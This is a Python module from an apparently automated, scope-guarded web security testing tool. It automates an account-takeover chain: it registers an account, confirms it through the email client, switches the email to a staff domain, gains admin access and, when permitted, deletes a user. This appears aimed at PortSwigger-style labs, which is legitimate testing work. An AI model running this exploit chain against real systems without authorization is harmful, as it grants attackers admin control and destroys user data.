"""
Account-lifecycle flow: registration + email verification + privilege via email
domain (the "inconsistent security controls" pattern).

Chain: register a user (email at the inbox domain) -> read the confirmation link
from the email client -> confirm -> log in -> change the email to the company/staff
domain (often not re-validated) -> reach the admin panel. If the scope opts into a
destructive objective (`allow_destructive` + `objective_delete_user`), it then
performs the objective (e.g. delete a user) and checks the solved/winning state.

Cross-host by design: reading the email client usually means a second host, which
MUST be listed in `authorized_base_urls`. Everything is still scope-guarded.
"""

from __future__ import annotations

import logging
import re
import secrets
from urllib.parse import urlparse

from ..core.scope import Scope, ScopeError
from ..engine.http_client import RateLimiter, ScopedClient
from ..testing.schema import Severity, TestCase, TestStep, VulnClass, Verdict

logger = logging.getLogger("venom.flows.account_takeover")

_CSRF = re.compile(r'name=["\']?csrf["\']?[^>]*?value=["\']?([^"\'\s>]+)')
_PRIV = re.compile(r'@([A-Za-z0-9.-]+\.[A-Za-z]{2,})')


def _csrf(html: str | None) -> str | None:
    m = _CSRF.search(html or "")
    return m.group(1) if m else None


def _scrape_priv_domain(register_html: str) -> str:
    """Pull the staff/company email domain from a register-page hint, skipping
    no-reply@ system addresses."""
    for dom in _PRIV.findall(register_html or ""):
        if "noreply" not in dom.lower() and "no-reply" not in dom.lower():
            return dom
    return ""


def _find_confirm(inbox_html: str, recipient: str, lab_host: str) -> str | None:
    """Find the confirmation link in the email addressed to `recipient`."""
    i = (inbox_html or "").find(recipient)
    near = inbox_html[i:i + 5000] if i >= 0 else (inbox_html or "")
    for m in re.finditer(r'https?://[^\s"\'<>]+', near):
        url = m.group(0).rstrip('"\'<>)')
        if lab_host in url and ("token" in url or "confirm" in url):
            return url
    return None


def _find_action(html: str, keyword: str) -> str | None:
    m = re.search(rf'action=["\']?([^"\' >]*{keyword}[^"\' >]*)', html or "")
    return m.group(1) if m else None


def _find_delete(admin_html: str, target: str) -> str | None:
    m = re.search(r'href=["\']([^"\']*delete[^"\']*username=)[^"\'&]*["\']', admin_html or "")
    return m.group(1) + target if m else None


def _rel(url: str) -> str:
    p = urlparse(url)
    return p.path + (f"?{p.query}" if p.query else "")


async def run(scope: Scope, registry, *, transport=None) -> list[TestCase]:
    if not scope.email_client_url:
        return []   # needs an inbox to read confirmation links
    has_register = any(e.path.rstrip("/").endswith("/register") for e in registry)
    if not has_register:
        return []

    lab_base = scope.authorized_base_urls[0]
    lab_host = urlparse(lab_base).hostname or ""
    ec = urlparse(scope.email_client_url)
    email_base = f"{ec.scheme}://{ec.netloc}"
    inbox_domain = ec.netloc
    limiter = RateLimiter(scope.rate_limit_per_second)

    try:
        lab = ScopedClient(scope, lab_base, role="ato", limiter=limiter, transport=transport)
        mail = ScopedClient(scope, email_base, role="ato-mail", limiter=limiter, transport=transport)
    except ValueError as exc:
        logger.warning("account-takeover skipped: %s (add the email host to authorized_base_urls)", exc)
        return []

    steps: list[TestStep] = []
    user = "venom" + secrets.token_hex(3)
    pw = "Passw0rd!" + secrets.token_hex(2)
    try:
        reg = await lab.request("GET", "/register", follow_redirects=True)
        reg_html = reg.text if reg else ""
        priv = scope.privileged_email_domain or _scrape_priv_domain(reg_html)
        steps.append(TestStep(step=1, description="GET /register", method="GET", path="/register",
                              actual_status=getattr(reg, "status_code", None)))

        await lab.request("POST", "/register", data={
            "csrf": _csrf(reg_html), "username": user,
            "email": f"{user}@{inbox_domain}", "password": pw}, follow_redirects=True)
        steps.append(TestStep(step=2, description=f"register '{user}' with inbox email",
                              method="POST", path="/register"))

        inbox = await mail.request("GET", ec.path or "/email", follow_redirects=True)
        link = _find_confirm(inbox.text if inbox else "", f"{user}@{inbox_domain}", lab_host)
        if link:
            cr = await lab.request("GET", _rel(link), follow_redirects=True)
            steps.append(TestStep(step=3, description="confirm email via inbox link",
                                  method="GET", path=urlparse(link).path,
                                  actual_status=getattr(cr, "status_code", None)))
        else:
            logger.info("account-takeover: no confirmation link found for %s", user)

        lgp = await lab.request("GET", "/login")
        await lab.request("POST", "/login", data={
            "csrf": _csrf(lgp.text if lgp else ""), "username": user, "password": pw},
            follow_redirects=True)
        steps.append(TestStep(step=4, description=f"log in as '{user}'", method="POST", path="/login"))

        if priv:
            acc = await lab.request("GET", "/my-account", follow_redirects=True)
            chg = _find_action(acc.text if acc else "", "change-email") or "/my-account/change-email"
            await lab.request("POST", chg, data={
                "csrf": _csrf(acc.text if acc else ""), "email": f"{user}@{priv}"},
                follow_redirects=True)
            steps.append(TestStep(step=5, description=f"change email to @{priv} (inconsistent control)",
                                  method="POST", path=chg))

        adm = await lab.request("GET", "/admin", follow_redirects=False)
        adm_ok = adm is not None and adm.status_code == 200
        steps.append(TestStep(step=6, description="access /admin panel", method="GET", path="/admin",
                              actual_status=getattr(adm, "status_code", None)))
        if not adm_ok:
            return []   # bypass not achieved

        solved = False
        target = scope.objective_delete_user
        if target and scope.allow_destructive:
            delpath = _find_delete(adm.text, target) or f"/admin/delete?username={target}"
            dr = await lab.request("GET", delpath, follow_redirects=True, destructive=True)
            home = await lab.request("GET", "/", follow_redirects=True)
            solved = bool(home is not None and "is-solved" in (home.text or ""))
            steps.append(TestStep(step=7, description=f"delete user '{target}' (objective)",
                                  method="GET", path=delpath,
                                  actual_status=getattr(dr, "status_code", None), destructive=True))
        elif target:
            logger.info("admin reached; delete '%s' skipped (set allow_destructive to perform it)", target)

        note = "LAB SOLVED (is-solved)" if solved else (
            "admin access achieved; destructive objective not run" if target else "admin access achieved")
        return [TestCase(
            test_id="ATO-001",
            vulnerability_class=VulnClass.PRIV_ESCALATION,
            hypothesis=("Inconsistent security controls: any user can register, then change their "
                        f"email to the company domain (@{priv or '?'}) which is trusted as staff, "
                        "granting administrative access (broken function-level authorization)."),
            risk_rating=Severity.CRITICAL,
            affected_endpoint="GET /admin",
            business_impact="Arbitrary user gains full administrative access (incl. deleting users).",
            steps=steps,
            origin="flow",
            verdict=Verdict.CONFIRMED_EXPLOIT,
            notes=[note],
            rag_source="PortSwigger: Inconsistent security controls",
        )]
    except ScopeError as exc:
        logger.warning("account-takeover blocked by scope: %s", exc)
        return []
    finally:
        await lab.aclose()
        await mail.aclose()
